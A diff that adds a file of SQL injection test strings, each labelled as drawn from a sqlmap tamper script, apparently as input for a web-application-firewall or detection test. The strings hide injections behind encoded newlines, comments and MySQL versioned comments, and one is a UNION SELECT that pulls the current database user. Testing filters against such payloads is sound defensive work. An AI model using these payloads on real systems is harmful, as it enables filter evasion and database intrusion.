@@ -1,0 +1,22 @@
+#
+# Attacks pulled out of the examples from SQLMAP
+#
+
+# https:#svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/space2mssqlhash.py
+1%23%0AAND%23%0A9227=9227
+
+# https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/space2morehash.py
+1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
+
+# https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/space2hash.py
+1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
+
+# https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/space2dash.py
+1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227
+
+# https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/modsecurityzeroversioned.py
+1+/*!00000AND+2>1*/--'
+
+# https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/halfversionedmorekeywords.py
+value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa
+
